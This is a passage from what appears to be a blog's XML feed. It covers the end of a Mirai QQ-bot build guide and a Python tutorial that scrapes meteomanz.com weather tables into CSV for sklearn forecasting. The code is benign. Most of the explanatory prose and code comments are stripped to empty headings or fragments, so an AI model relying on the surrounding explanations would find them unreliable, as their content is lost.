class="headerlink" title="i. "></a>i. </h3><p>IDEgradle<code>buldplugin</code><code>buid/mirai/</code>.jar<br><img src="/images/Mirai-qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%A1%86%E6%9E%B6kotlin_java%E6%95%99%E7%A8%8B.md-4.png" alt="buildPlugin"></p><h3 id="ii-mcl"><a href="#ii-mcl" class="headerlink" title="ii.mcl"></a>ii.mcl</h3><p>.jarmclplugincmdmcl.cmd</p><blockquote><p></p></blockquote><center>-END-</center>]]></content>
      
      
      <categories>
          
          <category> How-to </category>
          
          <category> Mirai </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python+sklearn()</title>
      <link href="/2020/12/13/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5/"/>
      <url>/2020/12/13/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><a href="https://github.com/Nambers/PYWeatherReport">github:PYWeatherReport</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><blockquote><p><br><a href="https://blog.csdn.net/qq_40832960/article/details/109260388">: python+sklearn+kaggle</a><br><a href="https://blog.csdn.net/qq_40832960/article/details/111146467">python+sklearn() </a><br><a href="https://blog.csdn.net/qq_40832960/article/details/111182425">python+sklearn() </a><br> <a href="https://blog.csdn.net/qq_40832960/article/details/111238926">python+sklearn() </a></p></blockquote><h2 id="0-"><a href="#0-" class="headerlink" title="0."></a>0.</h2><p><code></code><code></code> -&gt;  -&gt; <br><a href="https://blog.csdn.net/qq_40832960/article/details/109260388"></a></p><h2 id="1-"><a href="#1-" class="headerlink" title="1. "></a>1. </h2><h2 id="a-python"><a href="#a-python" class="headerlink" title="a.python"></a>a.python</h2><p>python+sklearnpythonpython3.*</p><h3 id="1-1-"><a href="#1-1-" class="headerlink" title="1.1 "></a>1.1 </h3><p>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install </span><br></pre></td></tr></table></figure><h4 id="1-1-1-sklearn"><a href="#1-1-1-sklearn" class="headerlink" title="1.1.1 sklearn"></a>1.1.1 sklearn</h4><p></p><h4 id="1-1-2-panda"><a href="#1-1-2-panda" class="headerlink" title="1.1.2 panda"></a>1.1.2 panda</h4><p>csv</p><h4 id="1-1-3-seaborn"><a href="#1-1-3-seaborn" class="headerlink" title="1.1.3 seaborn"></a>1.1.3 seaborn</h4><p></p><h4 id="1-1-4-joblib"><a href="#1-1-4-joblib" class="headerlink" title="1.1.4 joblib"></a>1.1.4 joblib</h4><p><code>*.pkl</code></p><h2 id="2-"><a href="#2-" class="headerlink" title="2."></a>2.</h2><p><a href="http://www.meteomanz.com/">www.meteomanz.com</a></p><h2 id="3-"><a href="#3-" class="headerlink" title="3."></a>3.</h2><p>(PS:)<br><img src="/images/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5.md-0.png" alt=""><br>(PS:)<br><img src="/images/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5.md-1.png" alt=""><br><br><img src="/images/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5.md-2.png" alt=""><br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.meteomanz.com/sy2?l=1&amp;cou=2250&amp;ind=59287&amp;d1=13&amp;m1=12&amp;y1=2020&amp;d2=13&amp;m2=12&amp;y2=2020</span><br></pre></td></tr></table></figure><p></p><ul><li><code>?</code><code>http://</code>,<code>www.meteomanz.com</code><code>/sy2</code><code>?</code></li><li><code>l</code>l&#x3D;1</li><li><code>cou</code><code>ind</code></li><li><code>d1</code><code>m1</code><code>y1</code></li><li><code>d2</code><code>m2</code><code>y2</code></li></ul><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.meteomanz.com/sy2?l=1&amp;cou=2250&amp;ind=59287&amp;d1=02&amp;m1=02&amp;y1=2019&amp;d2=13&amp;m2=12&amp;y2=2020</span><br></pre></td></tr></table></figure><p>2019&#x2F;2&#x2F;22020&#x2F;12&#x2F;13030</p><h2 id="4-"><a href="#4-" class="headerlink" title="4."></a>4.</h2><p>F12<br><img src="/images/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5.md-3.png" alt="DEV"><br>rbodytrtd(PS:)<br><img src="/images/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5.md-4.png" alt=""><br><img src="/images/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5.md-5.png" alt=""></p><p></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ol><li>Gbilibiliurl<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">   url = <span class="string">&quot;http://www.meteomanz.com/sy2?l=1&amp;cou=2250&amp;ind=59287&amp;d1=&quot;</span> + </span><br><span class="line">   <span class="built_in">str</span>(week_ago.day).zfill(<span class="number">2</span>) + </span><br><span class="line">   <span class="string">&quot;&amp;m1=&quot;</span> + <span class="built_in">str</span>(week_ago.month).zfill(<span class="number">2</span>) + </span><br><span class="line">   <span class="string">&quot;&amp;y1=&quot;</span> + <span class="built_in">str</span>(week_ago.month) + </span><br><span class="line">   <span class="string">&quot;&amp;d2=&quot;</span> + <span class="built_in">str</span>(week_pre.day - years[<span class="number">0</span>]).zfill(<span class="number">2</span>) + </span><br><span class="line">   <span class="string">&quot;&amp;m2=&quot;</span> + <span class="built_in">str</span>(week_pre.month).zfill(<span class="number">2</span>) + </span><br><span class="line">   <span class="string">&quot;&amp;y2=&quot;</span> + <span class="built_in">str</span>(week_pre.year - years[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># </span></span><br><span class="line">url = <span class="string">&quot;http://www.meteomanz.com/sy2?l=1&amp;cou=2250&amp;ind=59287&amp;d1=&quot;</span> + </span><br><span class="line"> <span class="built_in">str</span>(week_ago.day).zfill(<span class="number">2</span>) +</span><br><span class="line"> <span class="string">&quot;&amp;m1=&quot;</span> + <span class="built_in">str</span>( week_ago.month).zfill(<span class="number">2</span>) +</span><br><span class="line"><span class="string">&quot;&amp;y1=&quot;</span> + <span class="built_in">str</span>(week_ago.year - years[<span class="number">0</span>]) +</span><br><span class="line">   <span class="string">&quot;&amp;d2=&quot;</span> + <span class="built_in">str</span>(week_pre.day).zfill(<span class="number">2</span>) +</span><br><span class="line">   <span class="string">&quot;&amp;m2=&quot;</span> + <span class="built_in">str</span>(week_pre.month).zfill(<span class="number">2</span>) +</span><br><span class="line"> <span class="string">&quot;&amp;y2=&quot;</span> + <span class="built_in">str</span>(week_pre.year - years[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></li><li>@L-Zzxnngithub</li></ol><h2 id="5-"><a href="#5-" class="headerlink" title="5."></a>5.</h2><p><a href="https://blog.csdn.net/qq_40832960/article/details/103854145"></a></p><h3 id="5-1"><a href="#5-1" class="headerlink" title="5.1"></a>5.1</h3><p>(PS:)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://www.meteomanz.com/sy2?l=1&amp;cou=2250&amp;ind=59287</span><br><span class="line">&amp;d1=</span><br><span class="line">&amp;m1=</span><br><span class="line">&amp;y1=</span><br><span class="line">&amp;d2=</span><br><span class="line">&amp;m2=</span><br><span class="line">&amp;y2=</span><br></pre></td></tr></table></figure><p></p><p><code>datetime</code>python<br>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime <span class="keyword">as</span> DT</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">today = DT.datetime.now()</span><br><span class="line"><span class="comment"># b[0]</span></span><br><span class="line">week_ago = (today - DT.timedelta(days=b[<span class="number">0</span>])).date()</span><br><span class="line"> <span class="comment"># b[1]</span></span><br><span class="line"> week_pre = (today + DT.timedelta(days=b[<span class="number">1</span>])).date()</span><br></pre></td></tr></table></figure><p><code>b = [-15 0]</code><code>week_ago</code><code>week_pre</code><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">url = <span class="string">&quot;http://www.meteomanz.com/sy2?l=1&amp;cou=2250&amp;ind=59287&amp;d1=&quot;</span> + </span><br><span class="line"> <span class="built_in">str</span>(week_ago.day).zfill(<span class="number">2</span>) +</span><br><span class="line"> <span class="string">&quot;&amp;m1=&quot;</span> + <span class="built_in">str</span>( week_ago.month).zfill(<span class="number">2</span>) +</span><br><span class="line"><span class="string">&quot;&amp;y1=&quot;</span> + <span class="built_in">str</span>(week_ago.year - years[<span class="number">0</span>]) +</span><br><span class="line">   <span class="string">&quot;&amp;d2=&quot;</span> + <span class="built_in">str</span>(week_pre.day).zfill(<span class="number">2</span>) +</span><br><span class="line">   <span class="string">&quot;&amp;m2=&quot;</span> + <span class="built_in">str</span>(week_pre.month).zfill(<span class="number">2</span>) +</span><br><span class="line"> <span class="string">&quot;&amp;y2=&quot;</span> + <span class="built_in">str</span>(week_pre.year - years[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p><code>.zfill(2)</code>21011212<br></p><h3 id="5-2-"><a href="#5-2-" class="headerlink" title="5.2 "></a>5.2 </h3><p><code>GetData</code> class</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2020/12/16</span></span><br><span class="line"><span class="comment"># @Author: Eritque arcus</span></span><br><span class="line"><span class="comment"># @File: GetData.py</span></span><br><span class="line"><span class="comment"># : </span></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GetData</span>:</span><br><span class="line">    url = <span class="string">&quot;&quot;</span></span><br><span class="line">    headers = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url, header=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param url: </span></span><br><span class="line"><span class="string">        :param header: </span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.url = url</span><br><span class="line">        <span class="keyword">if</span> header == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="variable language_">self</span>.headers = &#123;</span><br><span class="line">                <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,&#x27;</span></span><br><span class="line">                          <span class="string">&#x27;*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, &#x27;</span></span><br><span class="line">                              <span class="string">&#x27;like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36 &#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.meteomanz.com&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.headers = header</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :return: </span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        http = urllib3.PoolManager()</span><br><span class="line">        <span class="keyword">return</span> http.request(<span class="string">&#x27;GET&#x27;</span>, <span class="variable language_">self</span>.url, headers=<span class="variable language_">self</span>.headers).data</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>urllib3GETheadersF12Networkhttp</p><h3 id="5-3-"><a href="#5-3-" class="headerlink" title="5.3 "></a>5.3 </h3><p><code>BeautifulSoup</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">g = GetData(url).Get()</span><br><span class="line">      <span class="comment"># beautifulsoup</span></span><br><span class="line">      soup = BeautifulSoup(g, <span class="string">&quot;html5lib&quot;</span>)</span><br><span class="line">      <span class="comment"># &lt;tbody&gt;</span></span><br><span class="line">      tb = soup.find(name=<span class="string">&quot;tbody&quot;</span>)</span><br><span class="line">      <span class="comment"># tr</span></span><br><span class="line">      past_tr = tb.find_all(name=<span class="string">&quot;tr&quot;</span>)</span><br><span class="line">      <span class="keyword">for</span> tr <span class="keyword">in</span> past_tr:</span><br><span class="line">          <span class="comment"># trtd</span></span><br><span class="line">          text = tr.find_all(name=<span class="string">&quot;td&quot;</span>)</span><br><span class="line">          flag = <span class="literal">False</span></span><br><span class="line">          <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text)):</span><br><span class="line">              <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                  text[i] = text[i].a.string</span><br><span class="line">                  <span class="comment"># bug0 00/11/2020(//),drop</span></span><br><span class="line">                  <span class="keyword">if</span> <span class="string">&quot;00/&quot;</span> <span class="keyword">in</span> text[i]:</span><br><span class="line">                      flag = <span class="literal">True</span></span><br><span class="line">              <span class="keyword">elif</span> i == <span class="number">8</span>:</span><br><span class="line">                  <span class="comment"># /8</span></span><br><span class="line">                  text[i] = text[i].string.replace(<span class="string">&quot;/8&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">              <span class="keyword">elif</span> i == <span class="number">5</span>:</span><br><span class="line">                  <span class="comment"># Hpa</span></span><br><span class="line">                  text[i] = text[i].string.replace(<span class="string">&quot; Hpa&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">              <span class="keyword">elif</span> i == <span class="number">6</span>:</span><br><span class="line">                  <span class="comment"># </span></span><br><span class="line">                  text[i] = re.sub(<span class="string">u&quot;[(.*?|N|W|E|S)]&quot;</span>, <span class="string">&quot;&quot;</span>, text[i].string)</span><br><span class="line">              <span class="keyword">else</span>:</span><br><span class="line">                  <span class="comment"># </span></span><br><span class="line">                  text[i] = text[i].string</span><br><span class="line">              <span class="comment"># 2()</span></span><br><span class="line">              <span class="comment">#  MAE=3.6021</span></span><br><span class="line">              text[i] = text[i].replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">              text[i] = text[i].replace(<span class="string">&quot;Tr&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br></pre></td></tr></table></figure><p></p><h3 id="5-4csv"><a href="#5-4csv" class="headerlink" title="5.4csv"></a>5.4csv</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line">   <span class="comment"># </span></span><br><span class="line">   f = <span class="built_in">open</span>(c, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  csv</span></span><br><span class="line">   csv_writer = csv.writer(f)</span><br><span class="line">   <span class="comment"># ,text</span></span><br><span class="line">   csv_writer.writerow(text)</span><br><span class="line">   <span class="comment"># </span></span><br><span class="line">   f.close()</span><br></pre></td></tr></table></figure><h3 id="5-6"><a href="#5-6" class="headerlink" title="5.6"></a>5.6</h3><p><code>Write.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2020/12/16</span></span><br><span class="line"><span class="comment"># @Author: Eritque arcus</span></span><br><span class="line"><span class="comment"># @File: Write.py</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> GetData <span class="keyword">import</span> GetData</span><br><span class="line"><span class="keyword">import</span> datetime <span class="keyword">as</span> DT</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>(<span class="params">t</span>):</span><br><span class="line">    <span class="keyword">return</span> t.replace(<span class="string">&quot; - &quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># : csv</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">years, b, c</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param years: [, ]</span></span><br><span class="line"><span class="string">    :param b: [, ]</span></span><br><span class="line"><span class="string">    :param c: csv</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. </span></span><br><span class="line">    f = <span class="built_in">open</span>(c, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.  csv</span></span><br><span class="line">    csv_writer = csv.writer(f)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. </span></span><br><span class="line">    <span class="comment"># , &quot;negAve&quot;, &quot;negMax&quot;, &quot;negMin&quot;</span></span><br><span class="line">    csv_writer.writerow([<span class="string">&quot;Time&quot;</span>, <span class="string">&quot;Ave_t&quot;</span>, <span class="string">&quot;Max_t&quot;</span>, <span class="string">&quot;Min_t&quot;</span>, <span class="string">&quot;Prec&quot;</span>, <span class="string">&quot;SLpress&quot;</span>, <span class="string">&quot;Winddir&quot;</span>, <span class="string">&quot;Windsp&quot;</span>, <span class="string">&quot;Cloud&quot;</span>])</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    today = DT.datetime.now()</span><br><span class="line">    <span class="comment"># 20</span></span><br><span class="line">    week_ago = (today - DT.timedelta(days=b[<span class="number">0</span>])).date()</span><br><span class="line">    <span class="comment"># 20</span></span><br><span class="line">    week_pre = (today + DT.timedelta(days=b[<span class="number">1</span>])).date()</span><br><span class="line">    <span class="comment"># id 59287  54857</span></span><br><span class="line">    <span class="built_in">id</span> = <span class="string">&quot;59287&quot;</span></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    url = <span class="string">&quot;http://www.meteomanz.com/sy2?l=1&amp;cou=2250&amp;ind=&quot;</span> + <span class="built_in">id</span> + <span class="string">&quot;&amp;d1=&quot;</span> + <span class="built_in">str</span>(week_ago.day).zfill(<span class="number">2</span>) + <span class="string">&quot;&amp;m1=&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">        week_ago.month).zfill(<span class="number">2</span>) + <span class="string">&quot;&amp;y1=&quot;</span> + <span class="built_in">str</span>(week_ago.year - years[<span class="number">0</span>]) + <span class="string">&quot;&amp;d2=&quot;</span> + <span class="built_in">str</span>(week_pre.day).zfill(</span><br><span class="line">        <span class="number">2</span>) + <span class="string">&quot;&amp;m2=&quot;</span> + <span class="built_in">str</span>(week_pre.month).zfill(<span class="number">2</span>) + <span class="string">&quot;&amp;y2=&quot;</span> + <span class="built_in">str</span>(week_pre.year - years[<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    g = GetData(url).Get()</span><br><span class="line">    <span class="comment"># beautifulsoup</span></span><br><span class="line">    soup = BeautifulSoup(g, <span class="string">&quot;html5lib&quot;</span>)</span><br><span class="line">    <span class="comment"># &lt;tbody&gt;</span></span><br><span class="line">    tb = soup.find(name=<span class="string">&quot;tbody&quot;</span>)</span><br><span class="line">    <span class="comment"># tr</span></span><br><span class="line">    past_tr = tb.find_all(name=<span class="string">&quot;tr&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> past_tr:</span><br><span class="line">        <span class="comment"># trtd</span></span><br><span class="line">        text = tr.find_all(name=<span class="string">&quot;td&quot;</span>)</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        negA = negMax = negMin = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text)):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                text[i] = text[i].a.string</span><br><span class="line">                <span class="comment"># bug0 00/11/2020,drop</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;00/&quot;</span> <span class="keyword">in</span> text[i]:</span><br><span class="line">                    flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">8</span>:</span><br><span class="line">                <span class="comment"># /8</span></span><br><span class="line">                text[i] = text[i].string.replace(<span class="string">&quot;/8&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">5</span>:</span><br><span class="line">                <span class="comment"># </span></span><br><span class="line">                text[i] = text[i].string.replace(<span class="string">&quot; Hpa&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">6</span>:</span><br><span class="line">                <span class="comment"># </span></span><br><span class="line">                text[i] = re.sub(<span class="string">u&quot;[(.*?|N|W|E|S)]&quot;</span>, <span class="string">&quot;&quot;</span>, text[i].string)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># </span></span><br><span class="line">                text[i] = text[i].string</span><br><span class="line">            <span class="comment"># 2()</span></span><br><span class="line">            <span class="comment">#  MAE=3.6021</span></span><br><span class="line">            text[i] = <span class="string">&quot;2&quot;</span> <span class="keyword">if</span> text[i] == <span class="string">&quot;-&quot;</span> <span class="keyword">else</span> text[i]</span><br><span class="line">            text[i] = <span class="string">&quot;2&quot;</span> <span class="keyword">if</span> text[i] == <span class="string">&quot;Tr&quot;</span> <span class="keyword">else</span> text[i]</span><br><span class="line">        text = text[<span class="number">0</span>:<span class="number">9</span>]</span><br><span class="line">        <span class="comment"># ext += [str(int(negA)), str(int(negMax)), str(int(negMin))]</span></span><br><span class="line">        <span class="comment"># 4. csv</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            csv_writer.writerow(text)</span><br><span class="line">    <span class="comment"># 5. </span></span><br><span class="line">    f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>GetData.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 